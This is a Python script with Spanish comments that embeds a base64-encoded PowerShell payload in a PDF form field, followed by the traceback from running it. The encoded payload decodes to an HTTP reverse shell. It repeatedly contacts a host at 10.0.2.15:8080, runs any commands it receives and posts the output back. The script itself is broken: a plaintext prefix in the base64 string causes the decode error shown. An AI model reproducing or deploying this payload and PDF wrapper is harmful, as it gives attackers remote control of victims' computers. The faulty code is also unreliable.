```
import base64
import PyPDF2

# Payload codificado en base64
encoded_payload = "powershell -s ABzAD0AJwAxADAALgAwAC4AMgAuADEANQA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAOQAwADYAZQBlADIAMAA5AC0AOAA4AGUAZAA4AGEANgA3AC0AZAA2AGMAZgA3ADcAZAA0ACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADkAMAA2AGUAZQAyADAAOQAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQBlADYAYgBiAC0ANwBiAGIAYgAiAD0AJABpAH0AOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsAJABjAD0AKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwA4ADgAZQBkADgAYQA2ADcAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AZQA2AGIAYgAtADcAYgBiAGIAIgA9ACQAaQB9ACkALgBDAG8AbgB0AGUAbgB0ADsAaQBmACAAKAAkAGMAIAAtAG4AZQAgACcATgBvAG4AZQAnACkAIAB7ACQAcgA9AGkAZQB4ACAAJABjACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwACAALQBFAHIAcgBvAHIAVgBhAHIAaQBhAGIAbABlACAAZQA7ACQAcgA9AE8AdQB0AC0AUwB0AHIAaQBuAGcAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQAcgA7ACQAdAA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHAAJABzAC8AZAA2AGMAZgA3ADcAZAA0ACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AZQA2AGIAYgAtADcAYgBiAGIAIgA9ACQAaQB9ACAALQBCAG8AZAB5ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAJABlACsAJAByACkAIAAtAGoAbwBpAG4AIAAnACAAJwApAH0AIABzAGwAZQBlAHAAIAAwAC4AOAB9AA=="

# Decodifica el payload
decoded_payload = base64.b64decode(encoded_payload).decode('utf-8')

# Ruta del archivo PDF original y modificado
pdf_original_path = 'ruta_del_archivo_original.pdf'
pdf_modified_path = 'ruta_del_archivo_modificado.pdf'

# Abre el archivo PDF original
with open(pdf_original_path, 'rb') as pdf_file:
    pdf_reader = PyPDF2.PdfReader(pdf_file)
    pdf_writer = PyPDF2.PdfWriter()

    # Copia las páginas del PDF original al PDF modificado
    for page in pdf_reader.pages:
        pdf_writer.add_page(page)

    # Agrega el contenido del payload como un nuevo campo de formulario en la última página
    pdf_writer.updatePageFormFieldValues(0, {'payload_field': [decoded_payload]})

    # Guarda el PDF modificado en un nuevo archivo
    with open(pdf_modified_path, 'wb') as modified_pdf_file:
        pdf_writer.write(modified_pdf_file)

print("PDF modificado creado en:", pdf_modified_path)
```

----

```bash
Traceback (most recent call last):
  File "/home/dp4ud/Desktop/tools/own/pdf-modify.py", line 8, in <module>
    decoded_payload = base64.b64decode(encoded_payload).decode('utf-8')
                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/base64.py", line 88, in b64decode
    return binascii.a2b_base64(s, strict_mode=validate)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
binascii.Error: Invalid base64-encoded string: number of data characters (1377) cannot be 1 more than a multiple of 4
```
